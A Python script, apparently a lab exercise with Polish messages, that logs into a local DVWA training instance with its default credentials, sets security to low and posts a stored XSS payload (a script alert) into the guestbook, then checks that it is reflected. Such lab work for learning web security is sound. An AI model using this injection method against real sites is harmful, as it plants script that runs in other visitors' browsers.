import requests
from bs4 import BeautifulSoup

LOGIN_URL = "http://localhost/DVWA/login.php"
SECURITY_URL = "http://localhost/DVWA/security.php"
XSS_URL = "http://localhost/DVWA/vulnerabilities/xss_s/"

USERNAME = "admin"
PASSWORD = "password"

session = requests.Session()

HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://localhost",
    "Connection": "keep-alive",
    "Referer": XSS_URL,
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i"
}

session = requests.Session()

def login():
    print("[*] Logowanie do DVWA...")
    r = session.get(LOGIN_URL)
    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.find("input", {"name": "user_token"})["value"]

    payload = {
        "username": USERNAME,
        "password": PASSWORD,
        "Login": "Login",
        "user_token": token
    }

    session.post(LOGIN_URL, data=payload)
    print(f"[+] Zalogowano na DVWA z danymi: {USERNAME} / {PASSWORD}")

def set_security_low():
    print("[*] Ustawianie poziomu zabezpieczeń na LOW...")
    r = session.get(SECURITY_URL)
    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.find("input", {"name": "user_token"})["value"]

    payload = {
        "security": "low",
        "seclev_submit": "Submit",
        "user_token": token
    }

    r = session.post(SECURITY_URL, data=payload)
    if "Security level set to low" in r.text:
        print("[+] Poziom zabezpieczeń ustawiony na LOW.")
    else:
        print("[-] Nie udało się ustawić poziomu zabezpieczeń.")

def run_xss_attack():
    print("[*] Rozpoczynam atak Stored XSS...")

    xss_payload = "<script>alert('XSS zaatakowano!');</script>"

    print(f"[*] Wstawianie złośliwego kodu XSS: {xss_payload}")

    r = session.get(XSS_URL)
    soup = BeautifulSoup(r.text, "html.parser")

    comment_payload = {
        "txtName": "d",
        "mtxMessage": xss_payload,
        "btnSign": "Sign+Guestbook"
    }

    r = session.post(XSS_URL, data=comment_payload, headers=HEADERS)
    if "Sign Guestbook" in r.text:
        print("[+] Komentarz z XSS został opublikowany!")
    else:
        print("[-] Nie udało się opublikować komentarza z XSS.")

    print(f"\n[*] Sprawdzanie, czy XSS jest wykonywany...")

    page_text = r.text.split("\n")

    for i, line in enumerate(page_text):
        if xss_payload in line:
            print(f"[+] Znalazłem XSS na linii {i}:")
            print(f"  Linia XSS: {line}")
            break
    else:
        print("[-] XSS nie zostało znalezione.")

if __name__ == "__main__":
    login()
    set_security_low()
    run_xss_attack()